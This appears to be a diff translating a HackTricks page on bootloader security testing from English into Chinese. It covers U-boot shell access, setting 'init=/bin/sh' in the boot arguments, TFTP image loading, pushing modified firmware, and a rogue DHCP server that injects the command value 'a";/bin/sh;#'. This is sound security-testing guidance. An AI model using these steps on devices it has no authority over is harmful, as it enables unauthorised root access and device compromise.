@@ -1,51 +1,51 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-The following steps are recommended for modifying device startup configurations and bootloaders like U-boot:
+以下步骤建议用于修改设备启动配置和引导加载程序，如 U-boot：
 
-1. **Access Bootloader's Interpreter Shell**:
+1. **访问引导加载程序的解释器 Shell**：
 
-   - During boot, press "0", space, or other identified "magic codes" to access the bootloader's interpreter shell.
+- 在启动期间，按 "0"、空格或其他识别的 "魔法代码" 以访问引导加载程序的解释器 Shell。
 
-2. **Modify Boot Arguments**:
+2. **修改引导参数**：
 
-   - Execute the following commands to append '`init=/bin/sh`' to the boot arguments, allowing execution of a shell command:
-     %%%
-     #printenv
-     #setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
-     #saveenv
-     #boot
-     %%%
+- 执行以下命令将 '`init=/bin/sh`' 附加到引导参数中，以允许执行 Shell 命令：
+%%%
+#printenv
+#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
+#saveenv
+#boot
+%%%
 
-3. **Setup TFTP Server**:
+3. **设置 TFTP 服务器**：
 
-   - Configure a TFTP server to load images over a local network:
-     %%%
-     #setenv ipaddr 192.168.2.2 #local IP of the device
-     #setenv serverip 192.168.2.1 #TFTP server IP
-     #saveenv
-     #reset
-     #ping 192.168.2.1 #check network access
-     #tftp ${loadaddr} uImage-3.6.35 #loadaddr takes the address to load the file into and the filename of the image on the TFTP server
-     %%%
+- 配置 TFTP 服务器以通过本地网络加载映像：
+%%%
+#setenv ipaddr 192.168.2.2 #设备的本地 IP
+#setenv serverip 192.168.2.1 #TFTP 服务器 IP
+#saveenv
+#reset
+#ping 192.168.2.1 #检查网络访问
+#tftp ${loadaddr} uImage-3.6.35 #loadaddr 是加载文件的地址和 TFTP 服务器上映像的文件名
+%%%
 
-4. **Utilize `ubootwrite.py`**:
+4. **使用 `ubootwrite.py`**：
 
-   - Use `ubootwrite.py` to write the U-boot image and push a modified firmware to gain root access.
+- 使用 `ubootwrite.py` 写入 U-boot 映像并推送修改过的固件以获得 root 访问权限。
 
-5. **Check Debug Features**:
+5. **检查调试功能**：
 
-   - Verify if debug features like verbose logging, loading arbitrary kernels, or booting from untrusted sources are enabled.
+- 验证是否启用了调试功能，如详细日志记录、加载任意内核或从不受信任的来源启动。
 
-6. **Cautionary Hardware Interference**:
+6. **谨慎的硬件干扰**：
 
-   - Be cautious when connecting one pin to ground and interacting with SPI or NAND flash chips during the device boot-up sequence, particularly before the kernel decompresses. Consult the NAND flash chip's datasheet before shorting pins.
+- 在设备启动序列期间，特别是在内核解压缩之前，连接一个引脚到地并与 SPI 或 NAND 闪存芯片交互时要小心。在短接引脚之前，请查阅 NAND 闪存芯片的数据手册。
 
-7. **Configure Rogue DHCP Server**:
-   - Set up a rogue DHCP server with malicious parameters for a device to ingest during a PXE boot. Utilize tools like Metasploit's (MSF) DHCP auxiliary server. Modify the 'FILENAME' parameter with command injection commands such as `'a";/bin/sh;#'` to test input validation for device startup procedures.
+7. **配置恶意 DHCP 服务器**：
+- 设置一个恶意 DHCP 服务器，使用恶意参数供设备在 PXE 启动期间获取。利用 Metasploit 的 (MSF) DHCP 辅助服务器等工具。修改 'FILENAME' 参数，使用命令注入命令，如 `'a";/bin/sh;#'` 来测试设备启动程序的输入验证。
 
-**Note**: The steps involving physical interaction with device pins (\*marked with asterisks) should be approached with extreme caution to avoid damaging the device.
+**注意**：涉及与设备引脚物理交互的步骤（\*用星号标记）应极其谨慎，以避免损坏设备。
 
-## References
+## 参考文献
 
 - [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
 
